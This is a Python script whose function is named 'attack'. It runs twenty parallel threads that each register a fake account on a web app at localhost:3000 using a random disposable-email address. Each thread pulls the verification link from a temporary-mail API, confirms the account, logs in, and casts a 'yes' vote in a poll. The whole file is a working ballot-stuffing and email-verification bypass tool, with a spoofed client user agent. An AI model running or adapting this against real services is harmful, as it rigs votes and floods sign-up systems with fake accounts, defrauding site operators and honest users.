import re
import random
import string
import requests
import time
import threading

# DEST_IP = "192.168.83.232"
DEST_IP = "localhost"
BASE_URL = f"http://{DEST_IP}:3000"

def register(url, email):
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    payload = {
        "email": email,
        "password": password
    }
    response = requests.post(url, data=payload)
    print(response.text)
    if response.ok and "Error" not in response.text:
        return password
    return

def login_and_respond_poll(email: str, password: str):
    login_url = BASE_URL + "/auth/login"
    data = {"email": email, "password": password}

    print(data)
    poll_url = BASE_URL + "/poll"

    headers = {
        "User-Agent": "PostmanRuntime/7.41.2"
    }

    response = requests.post(login_url, data=data, headers=headers)
    header = response.request.headers["Cookie"]
    data = {"poll": "yes"}
    response = requests.post(poll_url, data=data, headers={"cookie": header})
    print(response.text)


flag = True

def attack():
    # Generate a random name (not used in this example but shown as per original code)
    name = ''.join(random.choices(string.ascii_lowercase, k=10))
    # name = "deepak1234"
    sender_email = "studysphere41@gmail.com"

    temp_email = f"{name}@vintomaper.com"
    # password = "KK5x5N7KD9"

    print("Registring...")
    password = register(f'{BASE_URL}/auth/register', temp_email)
    if not password:
        return

    time.sleep(1)
    url1 = f'https://cryptogmail.com/api/emails?inbox={temp_email}'

    try:
        i = 0
        while i < 20 and flag:
            response1 = requests.get(url1)
            # response1.raise_for_status()
            data = response1.json() if response1.status_code == 200 else {}
            
            # Extract the email ID from the response
            email_data = data.get('data', [])
            email_data = [data for data in email_data if data.get("sender", {}).get("email", "").lower() == sender_email.lower()]
            if email_data:
                email_id = email_data[0].get('id')
                print(f"Email ID: {email_id}")

                url2 = f'https://cryptogmail.com/api/emails/{email_id}'

                # Headers for the second request
                headers = {
                    "accept": "text/html,text/plain",
                    "accept-language": "ru,en-US;q=0.9,en;q=0.8,ru-RU;q=0.7",
                    "priority": "u=1, i",
                    "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Google Chrome\";v=\"128\"",
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "\"Windows\"",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "cookie": "_ga=GA1.1.2092607459.1724944527; _ga_L94ZL4CNYY=GS1.1.1724944527.1.1.1724945149.55.0.0",
                    "Referer": "https://cryptogmail.com/",
                    "Referrer-Policy": "strict-origin-when-cross-origin"
                }

                # Perform the second request with headers
                response2 = requests.get(url2, headers=headers)
                response2.raise_for_status()
                data2 = response2.text
                link_pattern = r"https?://[^\s]+"
                pattern = re.compile(link_pattern)
                reglink = pattern.search(data2).group().replace("localhost", DEST_IP)
                print(f"{reglink=}")
                r = requests.get(reglink)
                r.raise_for_status()
                login_and_respond_poll(temp_email, password)
                return
            else:
                i += 1
                time.sleep(i*0.3)
        print("Failed")
    except ValueError as e:
        print(f"Failed to decode JSON: {e}")

# Call the function

threads = []

# Create multiple threads
for i in range(20):  # Number of parallel threads
    thread = threading.Thread(target=attack) #, args=(f"Thread-{i+1}", i+2))
    threads.append(thread)

# Start all threads
for thread in threads:
    thread.start()

# Wait for all threads to finish
for thread in threads:
    thread.join()
